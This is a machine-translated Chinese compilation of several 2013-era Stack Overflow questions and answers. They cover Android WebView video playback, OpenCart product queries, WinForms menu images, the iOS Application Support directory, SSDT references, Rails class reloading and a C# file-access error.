*stripos*将与您的 *preg_match* 做同样的事情，但语法更友好，执行速度更快。

# html5-video - MediaPlayer 错误 (1, -2147483648) android 编程

> ID：16204981
> 
> 赞同：4
> 
> 时间：2013-04-25T01:31:46.997
> 
> 标签：html5-video, android-video-player, android-sdk-2.1

我的代码播放 html5 视频时遇到了一些问题。我在 powerpoint 中创建了一个简短的演示文稿并将其导出为 html5，它包含一个视频，我已将导出的文件复制到我在 android 中的资产文件中购买我的视频没有播放。

```
import android.app.Activity;
import android.os.Bundle;
import android.webkit.WebView;
import android.webkit.WebChromeClient;
import android.webkit.WebViewClient;

public class WebViewActivity7 extends Activity {

private WebView webView7;

public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.webview7);

    webView7 = (WebView) findViewById(R.id.webView8);
    webView7.getSettings().setJavaScriptEnabled(true);
    webView7.getSettings().setAllowFileAccess(true);
    webView7.getSettings().setPluginsEnabled(true);
    webView7.getSettings().setAllowFileAccess(true);
    webView7.setWebChromeClient(new WebChromeClient());
    webView7.setWebViewClient(new WebViewClient());
    webView7.getSettings().setBuiltInZoomControls(true);
    webView7.loadUrl(url);

}
   String url ="file:///android_asset/HTML5.html";
   } 
```

我演示文稿中的其他所有内容都像一个魅力，除了视频，它不播放，我收到以下错误，当我在我的 android 平板电脑 - Android 4.0 上的屏幕上播放视频时：

> 媒体播放器错误 (1, -2147483648)

在过去的 5 天里，我一直在尝试解决我的问题，我已经阅读了很多论坛，多次更改我的代码，但一无所获。

我在一个帖子中发现，出现上述错误的原因是：

1.  文件路径错误。找到不正确的目录或 Url 或 Uri。
2.  媒体文件有误，格式不兼容。
3.  缺少权限。

我已经在我的应用程序上检查了上述所有内容，但仍然找不到解决方法。

我的 html5 文件和文件夹上的其他所有内容都可以正常工作，所以我认为这不是目录问题。我嵌入的视频文件是 .mp4 和 .webm 沙子，应该支持。我查看了我的文件和文件夹的权限，一切似乎都很好。我的应用程序的 iPad 版本使用相同的 html5 文件和文件夹运行良好，并且视频运行良好。

任何人都知道如何解决这个问题，编码应该很有趣，但是在解决这个问题 5 天后，我又重新考虑了。

谢谢你。民进党

除了以上内容：

我在另一个论坛发现android不允许播放大于1MB的视频文件，这是真的吗？我的一个视频是 3.2 MB，另一个是 29 MB。

**答：** 根据我的观察，有关视频大小的数据并不真实。我已经设置了我的视频（只有 MP4 视频文件，没有 HTML5 代码）从“res/raw”文件夹播放，一切都很好。我只是无法让它们从嵌入在 HTML5 中的资产文件夹中播放。

仍在寻找解决方案，但是将我的视频放在“res/raw”文件夹中，这是解决我的问题的一个很好的选择。

民进党

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-05-25T21:53:05.510

I have solved this problem by using copyAssets into sd card and running the index.HTML from the sdcard. see post [Running an html5 site withing android app](https://stackoverflow.com/questions/23818955/running-an-html5-site-withing-android-app-not-responding-message/23819140#23819140)

# php - opencart 按型号名称获取产品

> ID：16204985
> 
> 赞同：1
> 
> 时间：2013-04-25T01:32:41.093
> 
> 标签：php, opencart

有没有办法在 opencart 中按其型号名称加载产品，我正在处理的网站有许多具有相同子型号的相关产品。例如，见下文。

产品型号名称：

```
thq-0034,
thq-0034-big,
thq-0034-small,
thq-0034-blue,
thq-0035,
thq-0035-big,
thq-0035-small,
thq-0035-blue, 
```

IE。将产品 thq-0034/5 的产品页面链接到 thq-0034/5-big 或 thq-0034/5-blue Companion 产品，而不在管理菜单中将它们设为所有相关产品。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T10:27:45.163

最简单的方法是在`product`表上运行查询

```
$result = $this->db->query("SELECT product_id FROM `" . DB_PREFIX . "product` WHERE `model` LIKE 'thq-0034%'"); 
```

这将返回一个结果数组，`product_id`每个产品匹配一个键

# c# - 可点击的 ToolStripMenuItem 图片

> ID：16204987
> 
> 赞同：1
> 
> 时间：2013-04-25T01:32:42.333
> 
> 标签：c#, winforms, click, contextmenu, toolstripitem

我正在开发一个 C# winForm 应用程序，它有一个动态添加 toolStripMenuItems 的 ContextMenuStrip。我的资源文件中还有一个图标，我分配给 toolStripMenuItem.Image 属性并处理 toolStripMenuItem.Click 事件。如果单击图像（图标）但图标/图像没有单击事件，我实际上想处理单击事件。如何创建一个可以分配给 toolStripMenuItem 的 image 属性的点击图标？

提前致谢

-DA

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T12:24:58.733

**您必须自定义 ToolStripItem 并使用ContentRectangle**属性获取图像所在的矩形。

查看 MSDN 上的[ComputeImageAndTextLayout 代码示例](http://msdn.microsoft.com/en-us/library/system.windows.forms.toolstripitem.contentrectangle.aspx)，它计算图像所在的矩形。

在 ToolStripItem 的 MouseDown 事件中，您将获取 MouseDown 事件发生时鼠标在 ToolStripItem 中的坐标，如下所示

```
void item_MouseDown(object sender, MouseEventArgs e)
{
    int x = e.X;
    int y = e.Y;
} 
```

然后，您必须计算您的 MouseDown 坐标是否位于获得的矩形中并引发 ImageClicked 事件。

使用相同的方法，您还可以引发 TextClicked 事件。

# ios - iOS：无法将文件保存到“应用程序支持”文件夹，但可以保存到“文档”

> ID：16204988
> 
> 赞同：35
> 
> 时间：2013-04-25T01:32:47.877
> 
> 标签：ios, file, save, directory

我可以使用自定义名称下载二进制文件并将其保存到“文档”文件夹中。

如果我只是将 URL 更改为“应用程序支持”文件夹而不是“文档”文件夹，则它无法写入该 URL，说它不存在。

下面是 URL 构建代码：

```
- ( NSURL * ) getSaveFolder
{
    NSURL * appSupportDir    = nil;
    NSURL * appDirectory     = nil;
    NSArray * possibleURLs   = [[NSFileManager defaultManager] URLsForDirectory:NSApplicationSupportDirectory inDomains:NSAllDomainsMask];

    if ( [possibleURLs count] >= 1 )
    {
        appSupportDir = [possibleURLs objectAtIndex:0];
    }

    if ( appSupportDir != nil)
    {
        NSString * appBundleID = [[NSBundle mainBundle] bundleIdentifier];
        appDirectory           = [appSupportDir URLByAppendingPathComponent:appBundleID];
    }

    return appSupportDir;
} 
```

这是保存代码：

```
- ( void ) writeOutDataToFile:( NSData * )data
{
    NSURL * finalURL = [self.rootPathURL URLByAppendingPathComponent:self.aFileName];

    [data writeToURL:finalURL atomically:YES];
} 
```

* * *

如果我将 NSArray 更改为：

```
NSArray * possibleURLs   = [[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask]; 
```

然后它保存得很好。

我已经阅读了有关文件的 Apple Docs 并且无法解决这个问题 - 我错过了什么？

* * *

## 回答 #1

> 赞同：52
> 
> 时间：2013-07-02T16:25:44.210

如果有人不确定如何执行 rmaddy 描述的操作：

```
NSString *appSupportDir = [NSSearchPathForDirectoriesInDomains(NSApplicationSupportDirectory, NSUserDomainMask, YES) lastObject];
//If there isn't an App Support Directory yet ... 
if (![[NSFileManager defaultManager] fileExistsAtPath:appSupportDir isDirectory:NULL]) {
    NSError *error = nil;
//Create one 
    if (![[NSFileManager defaultManager] createDirectoryAtPath:appSupportDir withIntermediateDirectories:YES attributes:nil error:&error]) {
        NSLog(@"%@", error.localizedDescription);
    }
    else {
// *** OPTIONAL *** Mark the directory as excluded from iCloud backups 
        NSURL *url = [NSURL fileURLWithPath:appSupportDir];
        if (![url setResourceValue:@YES
                            forKey:NSURLIsExcludedFromBackupKey
                             error:&error])
        {
            NSLog(@"Error excluding %@ from backup %@", url.lastPathComponent, error.localizedDescription);
        }
        else {
            NSLog(@"Yay");
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：51
> 
> 时间：2013-04-25T01:39:11.193

与`Documents`目录不同的是，该`Application Support`目录默认不存在于应用的沙箱中。您需要先创建它，然后才能使用它。

获取目录引用的更简单的方法是：

```
NSArray *paths = NSSearchPathForDirectoriesInDomains(NSApplicationSupportDirectory, NSUserDomainMask, YES);
NSString *appSupportDirectory = paths.firstObject; 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2015-08-01T09:13:44.750

我遇到了同样的问题，并决定使用更简洁的方法：

```
let fileManager = NSFileManager.defaultManager()
let urls = fileManager.URLsForDirectory(.ApplicationSupportDirectory, inDomains: .UserDomainMask) as! [NSURL]
if let applicationSupportURL = urls.last {
    fileManager.createDirectoryAtURL(applicationSupportURL, withIntermediateDirectories: true, attributes: nil, error: nil)
} 
```

这是有效的，因为`createDirectoryAtURL`using`withIntermediateDirectories: true`仅在文件夹不存在时才创建该文件夹。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2019-03-27T04:48:44.200

一个班轮 - 如有必要，也会创建：

```
[[NSFileManager defaultManager] URLForDirectory:NSApplicationSupportDirectory inDomain:NSUserDomainMask appropriateForURL:nil create:YES error:nil] 
```

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2017-02-24T00:27:52.623

这是一些适用于 iOS 的 Swift 代码，可以将二进制数据文件写入应用程序支持目录。其中部分内容的灵感来自 chrysAllwood 的回答。

```
 /// Method to write a file containing binary data to the "application support" directory.
   ///
   /// - Parameters:
   ///   - fileName: Name of the file to be written.
   ///   - dataBytes: File contents as a byte array.
   ///   - optionalSubfolder: Subfolder to contain the file, in addition to the bundle ID subfolder.
   ///                        If this is omitted no extra subfolder is created/used.
   ///   - iCloudBackupForFolder: Specify false to opt out from iCloud backup for whole folder or
   ///                            subfolder. This is only relevant if this method call results in
   ///                            creation of the folder or subfolder, otherwise it is ignored.
   /// - Returns: Nil if all OK, otherwise text for a couple of non-Error errors.
   /// - Throws: Various errors possible, probably of type NSError.
   public func writeBytesToApplicationSupportFile(_ fileName : String,
                                                  _ dataBytes : [UInt8],
                                                  optionalSubfolder : String? = nil,
                                                  iCloudBackupForFolder : Bool = true)
                                                 throws -> String? {

      let fileManager = FileManager.default

      // Get iOS directory for "application support" files
      let appSupportDirectory =
                  fileManager.urls(for: .applicationSupportDirectory, in: .userDomainMask).first
      if appSupportDirectory == nil {
         return "Unable to determine iOS application support directory for this app."
      }

      // Add "bundle ID" as subfolder. This is recommended by Apple, although it is probably not
      // necessary.
      if Bundle.main.bundleIdentifier == nil {
         return "Unable to determine bundle ID for the app."
      }
      var mySupportDirectory =
                  appSupportDirectory!.appendingPathComponent(Bundle.main.bundleIdentifier!)

      // Add an additional subfolder if that option was specified
      if optionalSubfolder != nil {
         mySupportDirectory = appSupportDirectory!.appendingPathComponent(optionalSubfolder!)
      }

      // Create the folder and subfolder(s) as needed
      if !fileManager.fileExists(atPath: mySupportDirectory.path) {
         try fileManager.createDirectory(atPath: mySupportDirectory.path,
                                         withIntermediateDirectories: true, attributes: nil)

         // Opt out from iCloud backup for this subfolder if requested
         if !iCloudBackupForFolder {
            var resourceValues : URLResourceValues = URLResourceValues()
            resourceValues.isExcludedFromBackup = true
            try mySupportDirectory.setResourceValues(resourceValues)
         }
      }

      // Create the file if necessary
      let mySupportFile = mySupportDirectory.appendingPathComponent(fileName)
      if !fileManager.fileExists(atPath: mySupportFile.path) {
         if !fileManager.createFile(atPath: mySupportFile.path, contents: nil, attributes: nil) {
            return "File creation failed."
         }
      }

      // Write the file (finally)
      let fileHandle = try FileHandle(forWritingTo: mySupportFile)
      fileHandle.write(NSData(bytes: UnsafePointer(dataBytes), length: dataBytes.count) as Data)
      fileHandle.closeFile()

      return nil
   } 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2019-09-05T13:13:07.697

斯威夫特 4.2 版本

```
 let fileManager = FileManager.default
    let urls = fileManager.urls(for: .applicationSupportDirectory, in: .userDomainMask)
    if let applicationSupportURL = urls.last {
        do{
            try fileManager.createDirectory(at: applicationSupportURL, withIntermediateDirectories: true, attributes: nil)
        }
        catch{
            print(error)
        }
    } 
```

# visual-studio - 带有 DB 项目参考的 SSDT 引发奇怪的编译错误

> ID：16204992
> 
> 赞同：0
> 
> 时间：2013-04-25T01:33:24.173
> 
> 标签：visual-studio, sql-server-data-tools

我有一个包含 2 个 SSDT 数据库项目的解决方案，一个引用另一个。在其中一个存储过程中，我有一个简单的更新语句，如下所示：

```
update [$(otherDb)]..OtherTable set TheField = @value where OtherTable.Id = @id 
```

我有许多存储过程在其他表上执行相同的操作，这个存储过程已经工作了好几个月，智能感知甚至能够显示表的所有列。即使我仍然收到错误消息

```
SQ71561: Procedure [dbo].[MyProcedure] has an unresolved reference to object [$(otherDb)].[dbo].[OtherTable].[TheField] 
```

任何机构有任何想法发生了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T01:41:26.450

删除 DBML 文件并重建项目做到了

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-09-07T10:57:32.833

这是乔尼·拉尔瓦尼。

我已经安装了 Visual Studio 2017，它的 SSDT 版本是 15.1。我检查了脚本中变量 [$(DATABASE)] 的使用情况，以下是观察结果-

1- 如果您使用 DB.dbo.Table 而不是 [$(DB)].dbo.Table，存储过程、表值函数和标量函数只会抛出未解析的引用警告。因此，即使我们不使用该变量，这些脚本中的构建也是成功的。2- 如果我们使用 DB.dbo.Table 而不是 [$(DB)].dbo.Table，设计内联函数和视图将引发未解决的引用错误。因此在这些脚本中需要变量引用。

上述两点也适用于 Visual Studio 2013 SSDT (12.0)，并且在那里的工作方式也相同。然而，当我们从 SQL 数据库导入或更新架构时，VS 2013 SSDT 有时也会在存储过程中引发多个未解析引用的错误。这是由于 2013 SSDT 中的错误造成的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-05-31T14:57:41.857

1.  确保下划线视图不使用 SELECT *
2.  删除引用并再次添加数据库引用，选择复选按钮 Suppress Warning...。
3.  重建项目-应该解决它

# ruby-on-rails - Rails 没有在开发模式下重新加载我的模型

> ID：16204995
> 
> 赞同：5
> 
> 时间：2013-04-25T01:33:52.577
> 
> 标签：ruby-on-rails, model, development-environment, reload

*   我正在使用 Rails 3.2.13
*   中`development.rb`，我有`config.cache_classes = false`
*   当我使用 Unicorn 或 Webrick 时出现问题

我有一个非常奇怪的行为。假设我在日志中输出了一些东西：`Rails.logger.warn "Hello"`

如果我重新加载页面，我会在日志中看到“Hello”。如果删除它，它将消失。但是如果我再把它放回去，它就不会出现......

此外，`raise "Fail!"`模型中的简单会导致正确引发异常。但是如果我删除`raise`并重新加载页面，它仍然会引发异常。

这是怎么回事？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-11T15:35:10.357

你有 rails-dev-boost 作为宝石吗？之前看到这会导致类似的问题

# c# - 写入本地路径时访问被拒绝？

> ID：16204996
> 
> 赞同：1
> 
> 时间：2013-04-25T01:34:39.227
> 
> 标签：c#, webclient

从我的 FTP 服务器下载并尝试用更新的文件覆盖该文件后，我收到一条异常消息：“已处理 UnauthorizedAccessException”，即访问路径 'C:\My Program\My Program\bin\Debug\ App_Data' 被拒绝。

这就是我的代码的样子：

```
private void downloadFile () {
    WebClient wc = new WebClient();
    wc.Proxy = null;
    wc.Credentials  = new NetworkCredential("user", "pass");

    byte[] fileData = wc.DownloadData("ftp://user:pass@mysite.tk/updates/App_Data/log.txt");
    File.WriteAllBytes(Application.StartupPath + "\\App_Data", fileData);   
} 
```

我是否只是遗漏了一些可以设置到`WebClient`实例中的内容，以允许“File.WriteAllBytes”将我从 FTP 服务器下载的文件写入本地计算机？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T01:49:02.690

仔细想想，这显然与`WebClient`. 如果您从 中获取相同的字节序列`WebClient`，并尝试将其写入同一个文件，您将得到相同的结果。

事实上，如果您尝试写入单个字节，甚至可能是零字节，您可能会得到相同的结果。

就像例外说的那样，

> 拒绝访问路径“C:\My Program\My Program\bin\Debug\App_Data”

该`App_Data`文件夹甚至存在吗？